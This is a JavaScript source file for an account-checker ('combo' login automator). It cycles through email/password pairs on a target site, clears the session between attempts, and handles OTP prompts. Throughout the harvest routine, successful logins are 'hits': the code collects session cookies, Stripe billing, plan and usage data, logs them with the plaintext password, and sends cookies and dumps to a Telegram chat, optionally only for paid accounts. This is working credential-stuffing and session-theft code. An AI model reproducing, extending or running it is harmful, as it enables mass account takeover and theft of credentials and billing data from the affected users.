// Port of LoginAutomator — per-worker login state machine.
// Stages: IDLE → LOGIN → (OTP) → VERIFY → finish → nuke → next combo.
// Driven by the same JSON bridge contract as Android: auth.page / auth.fill /
// shell.ready from login_hooks.js, plus kara:login-state.
'use strict';

const { nukeView } = require('./nuker');
const scraper = require('./scraper');
const cookiesMod = require('./cookies');
const telegram = require('./telegram');
const store = require('./store');

const LOGIN_TIMEOUT_MS = 90000;
const OTP_TIMEOUT_MS = 180000;
const BETWEEN_COMBOS_MS = 600;

const Stage = { IDLE: 'IDLE', LOGIN: 'LOGIN', OTP: 'OTP', VERIFY: 'VERIFY' };

class Automator {
  constructor(index, view, opts) {
    this.index = index;
    this.view = view;
    this.startUrl = opts.startUrl;
    this.onEvent = opts.onEvent || (() => {});
    this.queue = [];
    this.pos = 0;
    this.running = false;

    this.stage = Stage.IDLE;
    this.job = null;
    this.filledEmail = false;
    this.filledPassword = false;
    this.inflightEmail = false;
    this.inflightPassword = false;
    this.lastKind = '';
    this.deadlineTimer = null;
    this.doneTimer = null;
  }

  emit(type, data) {
    try { this.onEvent(this.index, { type, ...(data || {}) }); } catch (e) { /* ignore */ }
  }

  setStatus(status, extra) {
    this.emit('status', { status, email: this.job ? this.job.email : '', ...(extra || {}) });
  }

  /* ---------------- queue ---------------- */

  startQueue(combos) {
    this.queue = combos || [];
    this.pos = 0;
    this.running = true;
    this.emit('queue-start', { total: this.queue.length });
    this.startNextJob();
  }

  stop() {
    this.running = false;
    this.clearTimers();
    this.stage = Stage.IDLE;
    this.setStatus('idle');
  }

  get done() {
    return this.pos >= this.queue.length;
  }

  startNextJob() {
    this.clearTimers();
    if (!this.running || this.done) {
      this.stage = Stage.IDLE;
      this.setStatus(this.done ? 'done' : 'idle');
      this.emit('queue-done', {});
      return;
    }
    this.job = this.queue[this.pos];
    this.stage = Stage.LOGIN;
    this.filledEmail = false;
    this.filledPassword = false;
    this.inflightEmail = false;
    this.inflightPassword = false;
    this.lastKind = '';
    this.setStatus('loading');
    this.emit('lane-progress', { pos: this.pos, total: this.queue.length });

    // Fresh session BEFORE each combo (nuke-before-job, like Android).
    nukeView(this.view)
      .catch(() => {})
      .then(() => {
        if (!this.running) return;
        this.armDeadline(LOGIN_TIMEOUT_MS);
        return this.view.webContents.loadURL(this.startUrl);
      })
      .catch(() => this.finish('error', 'load failed'));
  }

  armDeadline(ms) {
    this.clearTimers();
    this.deadlineTimer = setTimeout(() => {
      if (this.stage === Stage.OTP) {
        this.finish('error', 'otp timeout');
      } else if (this.stage === Stage.LOGIN || this.stage === Stage.VERIFY) {
        this.finish('error', 'timeout');
      }
    }, ms);
    // Keep Node from holding the process open on timers alone.
    if (this.deadlineTimer.unref) this.deadlineTimer.unref();
  }

  clearTimers() {
    if (this.deadlineTimer) clearTimeout(this.deadlineTimer);
    if (this.doneTimer) clearTimeout(this.doneTimer);
    this.deadlineTimer = null;
    this.doneTimer = null;
  }

  /* ---------------- page calls ---------------- */

  call(fn, arg) {
    const payload = JSON.stringify(arg);
    return this.view.webContents
      .executeJavaScript(`window.__kara && window.__kara.${fn}(${payload})`)
      .catch(() => null);
  }

  fillEmail(email) {
    this.inflightEmail = true;
    this.setStatus('filling');
    this.call('fillEmail', email);
  }

  fillPassword(password) {
    this.inflightPassword = true;
    this.setStatus('filling');
    this.call('fillPassword', password);
  }

  submitOtp(code) {
    if (this.stage !== Stage.OTP) return;
    this.armDeadline(OTP_TIMEOUT_MS);
    this.call('fillOtp', code);
  }

  /* ---------------- bridge events ---------------- */

  onShellReady() {
    // Page (re)loaded with hooks; nothing to do until auth.page arrives.
  }

  onAuthPage(msg) {
    if (!this.running || this.stage === Stage.IDLE) return;
    const kind = msg.kind || 'unknown';
    const fields = msg.fields || {};
    const err = msg.error || null;

    if (err && (err.kind === 'invalid' || err.kind === 'blocked')) {
      this.finish(err.kind === 'invalid' ? 'invalid' : 'blocked', err.error);
      return;
    }

    if (this.stage !== Stage.LOGIN) return;

    const wantOtp = !!fields.otp || kind === 'otp';
    if (wantOtp) {
      this.stage = Stage.OTP;
      this.armDeadline(OTP_TIMEOUT_MS);
      this.setStatus('otp');
      this.emit('otp-needed', { email: this.job.email });
      return;
    }

    const wantEmail = !!fields.email;
    const wantPassword = !!fields.password;

    if (wantEmail && !this.filledEmail && !this.inflightEmail) {
      this.fillEmail(this.job.email);
      this.lastKind = kind;
      return;
    }

    const allowPassword =
      this.filledEmail || (this.lastKind && this.lastKind !== kind && !wantEmail) || (!wantEmail && wantPassword);
    if (wantPassword && allowPassword && !this.filledPassword && !this.inflightPassword && !this.inflightEmail) {
      this.fillPassword(this.job.password);
    }
    this.lastKind = kind;
  }

  onAuthFill(msg) {
    if (!this.running) return;
    if (msg.field === 'email') {
      this.inflightEmail = false;
      if (msg.ok) {
        this.filledEmail = true;
        // Ask the page to re-scan so the password step triggers promptly.
        this.call('scan');
      }
    } else if (msg.field === 'password') {
      this.inflightPassword = false;
      if (msg.ok) this.filledPassword = true;
      this.setStatus('waiting');
    } else if (msg.field === 'otp') {
      this.setStatus('waiting');
    }
  }

  async onLoginState(ok, detail) {
    if (!this.running || !ok) return;
    if (this.stage !== Stage.LOGIN && this.stage !== Stage.OTP) return;
    this.stage = Stage.VERIFY;
    this.clearTimers();
    this.setStatus('scraping');
    try {
      await this.harvest();
    } catch (e) {
      this.finish('error', 'scrape failed');
    }
  }

  /* ---------------- harvest (valid login) ---------------- */

  async harvest() {
    const ses = this.view.webContents.session;
    const jar = await ses.cookies.get({});
    const cheader = cookiesMod.cookieHeader(jar);
    const sessionCookie = cookiesMod.findSessionCookie(jar);

    const result = await scraper.scrape(sessionCookie, cheader);
    const checkedAt = new Date().toISOString();

    const dump =
      `email=${this.job.email}\n` +
      `password=${this.job.password}\n` +
      `checked_at=${checkedAt}\n` +
      `plan=${result.slug}\n` +
      `paid=${result.paid}\n` +
      `plan_name=${(result.plan && (result.plan.planInfo || {}).planName) || ''}\n` +
      `${sessionCookie ? sessionCookie.name : 'sessionToken'}=${sessionCookie ? sessionCookie.value : ''}\n` +
      `Cookie=${cheader}\n` +
      `--- stripe ---\n${JSON.stringify(result.stripe)}\n` +
      `--- plan ---\n${JSON.stringify(result.plan)}\n` +
      `--- usage_summary ---\n${JSON.stringify(result.usageSummary)}\n` +
      `--- usage ---\n${JSON.stringify(result.usage)}\n`;

    const header = `${this.job.email} · plan=${result.slug}${result.paid ? ' · paid' : ''}`;
    const netscape = cookiesMod.buildNetscape(jar, header);

    // Local hit log (mirrors HitStore.saveOk).
    store.appendHit({
      kind: 'ok',
      email: this.job.email,
      password: this.job.password,
      plan: result.slug,
      paid: result.paid,
      hitText: dump,
    });

    // Telegram (mirrors finalizeHarvest: hits only, honoring paid-only).
    const token = store.getToken();
    const chatId = store.getSettings().chatId;
    const paidOnly = store.getSettings().paidOnly;
    const shouldTg = !!(token && chatId && (!paidOnly || result.paid));
    if (shouldTg) {
      try {
        await telegram.sendHit(token, chatId, {
          email: this.job.email,
          plan: result.slug,
          paid: result.paid,
          cookiesText: netscape,
          dumpText: dump,
        });
      } catch (e) { /* telegram failure must not fail the combo */ }
    }

    this.finish('ok', result.slug);
  }

  /* ---------------- finish ---------------- */

  finish(verdict, detail) {
    if (!this.running) return;
    this.clearTimers();
    this.stage = Stage.IDLE;
    const email = this.job ? this.job.email : '';
    this.emit('verdict', { verdict, detail: detail || '', email });
    if (verdict !== 'ok') {
      store.appendHit({ kind: verdict, email, detail: detail || '' });
    }
    this.pos += 1;
    this.setStatus('done-combo');
    this.doneTimer = setTimeout(() => this.startNextJob(), BETWEEN_COMBOS_MS);
    if (this.doneTimer.unref) this.doneTimer.unref();
  }
}

module.exports = { Automator, Stage };
